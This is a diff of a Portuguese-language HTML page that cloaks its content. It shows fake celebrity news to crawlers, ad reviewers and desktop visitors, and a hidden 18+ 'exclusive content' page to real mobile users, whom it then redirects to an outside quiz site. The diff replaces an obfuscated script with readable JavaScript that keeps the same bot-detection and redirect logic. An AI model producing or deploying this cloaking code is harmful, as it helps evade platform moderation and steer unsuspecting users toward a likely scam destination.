@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Últimas Notícias - A Televisão</title> <!-- Título mantido -->
+    <title>Últimas Notícias - A Televisão</title>
     <style>
         * {
             margin: 0;
@@ -41,51 +41,54 @@
             border-bottom: 1px solid #d40000;
             padding-bottom: 10px;
         }
-        .btn {
-            background: #ff2d55;
-            color: white;
-            padding: 15px 30px;
-            border-radius: 50px;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 20px;
-            font-weight: bold;
-        }
         .hidden { display: none; }
     </style>
 </head>
 <body>
-    <!-- PÁGINA WHITE (com notícias genéricas) -->
+    <!-- PÁGINA WHITE -->
     <div id="white-page">
         <h1>Últimas Notícias</h1>
-        
         <div class="noticia">
             <h2>Anitta anuncia nova turnê internacional</h2>
             <p>A cantora confirmou shows na Europa e EUA para 2024...</p>
         </div>
-        
         <div class="noticia">
             <h2>Whindersson Nunes lança novo especial</h2>
             <p>Humorista estreia na Netflix nesta sexta-feira...</p>
         </div>
-        
-        <div class="noticia">
-            <h2>BBB 24: Confira os favoritos</h2>
-            <p>Saiba quem está liderando as apostas...</p>
-        </div>
-        
         <p><small>Fonte: <a href="https://www.atelevisao.com" style="color: #666;">A Televisão</a></small></p>
     </div>
 
-    <!-- PÁGINA BLACK (para humanos) -->
+    <!-- PÁGINA BLACK -->
     <div id="black-page" class="hidden">
         <h1>🔞 CONTEÚDO EXCLUSIVO</h1>
-        <p>Você será redirecionado automaticamente...</p>
+        <p>Redirecionando para a área VIP...</p>
     </div>
 
-    <!-- JAVASCRIPT OFUSCADO (MESMA LÓGICA, CÓDIGO ILEGÍVEL) -->
     <script>
-        function _0x4a3e(_0x3d7b28,_0x4a3e5f){const _0x1a6c32=_0x1a6c();return _0x4a3e=function(_0x4a3e8d,_0x3d7b28){_0x4a3e8d=_0x4a3e8d-0x8a;let _0x4a3e5f=_0x1a6c32[_0x4a3e8d];return _0x4a3e5f;},_0x4a3e(_0x3d7b28,_0x4a3e5f);}function _0x1a6c(){const _0x4a3e8d=['Android','iPhone','iPad','IEMobile','Opera\x20Mini','bot','facebook','google','meta','twitter','slurp','bing','getElementById','style','display','none','flex','black-page','white-page','location','href','https://avelino-star.github.io/Quiz/','3000','1000','A\x20Televisão'];_0x1a6c=function(){return _0x4a3e8d;};return _0x1a6c();}(function(_0x3d7b28,_0x4a3e5f){const _0x4a3e8d=_0x4a3e,_0x1a6c32=_0x3d7b28();while(!![]){try{const _0x4a3e5e=-parseInt(_0x4a3e8d(0x8f))/0x1+parseInt(_0x4a3e8d(0x90))/0x2*(-parseInt(_0x4a3e8d(0x94))/0x3)+parseInt(_0x4a3e8d(0x92))/0x4+-parseInt(_0x4a3e8d(0x8e))/0x5*(parseInt(_0x4a3e8d(0x91))/0x6)+-parseInt(_0x4a3e8d(0x93))/0x7*(parseInt(_0x4a3e8d(0x8d))/0x8)+parseInt(_0x4a3e8d(0x8c))/0x9;if(_0x4a3e5e===_0x4a3e5f)break;else _0x1a6c32['push'](_0x1a6c32['shift']());}catch(_0x3d7b28){_0x1a6c32['push'](_0x1a6c32['shift']());}}}(_0x1a6c,0x5f4bc));function isHuman(){const _0x4a3e8d=_0x4a3e,_0x3d7b28=/Android|iPhone|iPad|IEMobile|Opera\x20Mini/i[_0x4a3e8d(0x96)](navigator['userAgent']),_0x4a3e5f=new\x20RegExp(_0x4a3e8d(0x97))[_0x4a3e8d(0x96)](navigator[_0x4a3e8d(0x98)]);return _0x3d7b28&&!_0x4a3e5f;}if(isHuman()){setTimeout(()=>{document[_0x4a3e(0x9a)](_0x4a3e(0x9b))[_0x4a3e(0x99)]=_0x4a3e(0x9c),document[_0x4a3e(0x9a)](_0x4a3e(0x9d))[_0x4a3e(0x99)]=_0x4a3e(0x9e);setTimeout(()=>{window[_0x4a3e(0x9f)][_0x4a3e(0xa0)]=_0x4a3e(0xa1);},parseInt(_0x4a3e(0xa2)));},parseInt(_0x4a3e(0xa3)));}else{setTimeout(()=>{window[_0x4a3e(0x9f)][_0x4a3e(0xa0)]=_0x4a3e(0xa4);},parseInt(_0x4a3e(0xa2)));}console[_0x4a3e(0x95)](_0x4a3e(0xa5));
+        // Função para verificar se é humano (mobile e não é bot)
+        function isHuman() {
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
+            return isMobile && !isBot;
+        }
+
+        // Fluxo principal
+        if (isHuman()) {
+            // Humanos (mobile): Mostra black page e redireciona após 3s
+            setTimeout(() => {
+                document.getElementById('white-page').classList.add('hidden');
+                document.getElementById('black-page').classList.remove('hidden');
+                setTimeout(() => {
+                    window.location.href = "https://avelino-star.github.io/Quiz/";
+                }, 3000);
+            }, 1000);
+        } else {
+            // Bots/PCs: Redireciona para atelevisao.com após 3s
+            setTimeout(() => {
+                window.location.href = "https://www.atelevisao.com";
+            }, 3000);
+        }
     </script>
 </body>
 </html>
